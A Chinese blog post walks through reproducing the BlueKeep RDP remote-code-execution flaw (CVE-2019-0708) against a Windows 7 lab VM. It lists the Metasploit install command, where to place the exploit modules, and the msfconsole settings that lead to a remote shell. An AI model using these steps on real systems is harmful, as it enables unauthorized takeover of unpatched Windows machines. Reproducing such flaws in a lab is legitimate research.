# CVE-2019-0708—微软RDP远程桌面代码执行漏洞复现 - 0DayBug - 博客园

> 原文：[https://www.cnblogs.com/0daybug/p/11601670.html](https://www.cnblogs.com/0daybug/p/11601670.html)

# 0x01

2019年9月7日凌晨，msf上更新了0708的漏洞利用程序。

顿时安全群和朋友圈就爆炸了

-

奈何接到HW攻击队任务，又在家过了个中秋，0708才在今天更新。

# 0x02 环境

Windows 7 sp1

Kali

exp

# 0x02 利用

1.一键安装metasploit-framework

```
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall
```

2.下载Reference中的攻击套件放置文件到msf的相应文件夹

```
rdp.rb -> /opt/metasploit-framework/embedded/framework/lib/msf/core/exploit/rdp.rb
rdp_scanner.rb -> /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/rdp_scanner.rb
cve_2019_0708_bluekeep.rb -> /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb
cve_2019_0708_bluekeep_rce.rb -> /opt/metasploit-framework/embedded/framework/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb
```

msf命令：

使用msfconsole进入metasploit-framework ，reload_all重新加载0708rdp利用模块

![CVE-2019-0708—微软RDP远程桌面代码执行漏洞复现](../Images/0fc418c3b531b0726fd9ae9ba6e60ef9.png)

使用use exploit/windows/rdp/cve_2019_0708_bluekeep_rce启用0708RDP攻击模块

![CVE-2019-0708—微软RDP远程桌面代码执行漏洞复现](../Images/bb6ea19796433592b3a5ede8ecc00ef2.png)

使用set RHOSTS 设置受害机IP

![CVE-2019-0708—微软RDP远程桌面代码执行漏洞复现](../Images/4ff73999b5cef6bae9d808a7cbeeb21a.png)

使用set RPORT 设置受害机RDP端口号

![CVE-2019-0708—微软RDP远程桌面代码执行漏洞复现](../Images/0f6a2456948a6079514153d143f93057.png)

使用set target ID数字(可选为0-4)设置受害机机器架构

我使用的是Parallels Desktop,设置target 1

![CVE-2019-0708—微软RDP远程桌面代码执行漏洞复现](../Images/13618ce7bcb4ec983c4f3816a97fbdec.png)

使用exploit开始攻击,等待建立连接

![CVE-2019-0708—微软RDP远程桌面代码执行漏洞复现](../Images/197ba1673d803eac2e039a2687df8119.png)

建立连接以后,使用shell获得shell,再使用python获得交互式shell,执行whoami

![CVE-2019-0708—微软RDP远程桌面代码执行漏洞复现](../Images/318b38f0abfc628ce277614eb8234547.png)